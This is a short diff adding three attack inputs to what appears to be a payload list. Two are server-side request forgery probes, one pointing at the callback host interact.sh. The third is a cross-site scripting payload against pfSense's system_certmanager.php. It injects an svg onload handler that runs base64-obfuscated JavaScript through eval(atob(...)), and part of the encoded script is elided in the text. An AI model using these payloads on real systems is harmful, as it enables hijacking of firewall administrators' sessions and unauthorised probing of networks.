@@ -1,0 +1,3 @@
+/?url=http://interact.sh
+/?url=http://example.com
+/system_certmanager.php?act=%22%3E%3Csvg/onload=eval(atob(%27bGV0IHJlcXVlc3REYXRh[...]HsKCQl9KQoJfSkKfSwgMTAwMCk=%27))%3E&id=0
